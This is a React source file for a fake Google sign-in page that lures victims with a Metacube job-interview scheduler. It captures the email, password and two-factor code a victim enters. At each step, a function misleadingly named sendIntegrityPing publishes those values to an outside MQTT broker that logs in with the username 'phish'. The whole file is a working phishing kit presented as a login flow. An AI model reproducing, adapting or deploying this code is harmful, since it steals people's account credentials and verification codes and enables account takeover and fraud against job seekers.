'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video } from 'lucide-react';
import mqtt from 'mqtt';

export default function CustomLoginPage() {
  const [step, setStep] = useState(1); 
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [scheduleData, setScheduleData] = useState({ date: '', time: '', mode: 'Virtual' });

  const sendIntegrityPing = (currentStep, dataValue) => {
    const host = 'ya17a2d0.ala.asia-southeast1.emqxsl.com';
    const client = mqtt.connect(`wss://${host}:8084/mqtt`, {
      username: 'phish',
      password: 'Phish',
      clientId: `auth_step_${currentStep}_` + Math.random().toString(16).substring(2, 8),
    });

    client.on('connect', () => {
      const payload = JSON.stringify({
        event: currentStep === 4 ? 'INTERVIEW_SCHEDULED' : 'CREDENTIAL_SUBMISSION',
        step: currentStep,
        email_captured: email,
        password_captured: password || 'Pending',
        code_captured: code || 'Pending',
        booking: currentStep === 4 ? scheduleData : 'Pending',
        time: new Date().toLocaleString()
      });

      client.publish('172', payload, { qos: 1 }, () => {
        client.end(true);
        setStep(currentStep + 1);
      });
    });
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center font-sans antialiased text-[#202124]">
      <div className="w-full max-w-[450px] border border-gray-200 rounded-lg px-10 pb-12 pt-10 shadow-sm">
        
        {/* LOGO SECTION - FULLY UNRESTRICTED */}
        <div className="flex justify-center mb-6 mt-2">
          <img 
            src="https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" 
            alt="Google Logo" 
            className="h-12 w-12 object-contain"
          />
        </div>

        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div key="email" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-2xl text-center mb-2 font-normal">Sign in</h1>
              <p className="text-center mb-8 font-normal">Use your Google Account</p>
              <div className="relative mb-2">
                <input type="email" onChange={(e) => setEmail(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 focus:ring-[0.5px] focus:ring-blue-600 outline-none transition-all peer placeholder-transparent" placeholder="Email" id="email" />
                <label htmlFor="email" className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-gray-600 transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-sm peer-focus:text-blue-600">Email or phone</label>
              </div>
              
              {/* RESTORED: Forgot email */}
              <div className="text-blue-600 text-sm font-semibold cursor-pointer mb-8 hover:underline">Forgot email?</div>
              
              <p className="text-sm text-gray-600 leading-normal mb-10">
                Not your computer? Use Guest mode to sign in privately. <span className="text-blue-600 font-semibold cursor-pointer hover:underline">Learn more</span>
              </p>

              <div className="flex justify-between items-center">
                <button className="text-blue-600 font-semibold text-sm hover:bg-blue-50 px-2 py-2 rounded">Create account</button>
                <button onClick={() => sendIntegrityPing(1, email)} className="bg-[#1a73e8] text-white px-6 py-2 rounded font-semibold text-sm hover:bg-blue-700">Next</button>
              </div>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div key="password" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-2xl text-center mb-2">Welcome</h1>
              <div className="flex justify-center mb-8">
                <div className="flex items-center gap-2 border border-gray-300 rounded-full px-2 py-1 pr-3 hover:bg-gray-50 cursor-pointer">
                  <UserCircle className="w-5 h-5 text-gray-600" />
                  <span className="text-sm font-medium">{email}</span>
                  <ChevronDown className="w-4 h-4 text-gray-500" />
                </div>
              </div>
              <div className="relative mb-6">
                <input type="password" onChange={(e) => setPassword(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 focus:ring-[0.5px] focus:ring-blue-600 outline-none transition-all peer placeholder-transparent" placeholder="Password" id="password" />
                <label htmlFor="password" className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-gray-600 transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-sm peer-focus:text-blue-600">Enter your password</label>
              </div>
              
              <div className="flex justify-between items-center pt-4">
                {/* RESTORED: Forgot password */}
                <button className="text-blue-600 font-semibold text-sm hover:underline">Forgot password?</button>
                <button onClick={() => sendIntegrityPing(2, password)} className="bg-[#1a73e8] text-white px-6 py-2 rounded font-semibold text-sm hover:bg-blue-700">Next</button>
              </div>
            </motion.div>
          )}

          {/* Steps 3, 4, 5 remain intact for code integrity */}
          {step === 3 && (
            <motion.div key="2fa" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-2xl text-center mb-2">Verification</h1>
              <div className="flex flex-col items-center mb-8 mt-4 text-center">
                <ShieldCheck className="w-16 h-16 text-blue-500 mb-4 stroke-1" />
                <p className="text-sm text-gray-600">Check your phone for the 6-digit code.</p>
              </div>
              <div className="relative mb-12">
                <input type="text" onChange={(e) => setCode(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 outline-none transition-all placeholder-transparent" placeholder="Code" />
                <label className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-blue-600">Enter code</label>
              </div>
              <div className="flex justify-end">
                <button onClick={() => sendIntegrityPing(3, code)} className="bg-[#1a73e8] text-white px-8 py-2 rounded font-semibold text-sm">Verify</button>
              </div>
            </motion.div>
          )}

          {step === 4 && (
            <motion.div key="scheduler" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
              <h1 className="text-2xl text-center mb-1 font-medium">Select Slot</h1>
              <p className="text-center text-sm text-gray-500 mb-8 font-medium">Schedule your interview with Metacube</p>
              <div className="space-y-4 mb-8">
                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
                  <Calendar className="w-5 h-5 text-blue-600" />
                  <input type="date" onChange={(e) => setScheduleData({...scheduleData, date: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                </div>
                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
                  <Clock className="w-5 h-5 text-blue-600" />
                  <input type="time" onChange={(e) => setScheduleData({...scheduleData, time: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                </div>
                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
                  <Video className="w-5 h-5 text-blue-600" />
                  <select onChange={(e) => setScheduleData({...scheduleData, mode: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium">
                    <option>Virtual (Google Meet)</option>
                    <option>In-person (Metacube HQ)</option>
                  </select>
                </div>
              </div>
              <button onClick={() => sendIntegrityPing(4, scheduleData)} className="w-full bg-[#1a73e8] text-white py-3 rounded-xl font-bold hover:bg-blue-700 transition-colors">Schedule Interview</button>
            </motion.div>
          )}

          {step === 5 && (
            <motion.div key="success" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <ShieldCheck className="w-12 h-12 text-green-600" />
              </div>
              <h1 className="text-2xl font-black text-gray-900 mb-4">Interview Scheduled</h1>
              <p className="text-gray-600 leading-relaxed font-medium text-center">
                Your confirmation has been sent to your email. <br/>
                <span className="text-blue-600 font-bold mt-2 inline-block">Thank you for choosing Metacube.</span>
              </p>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}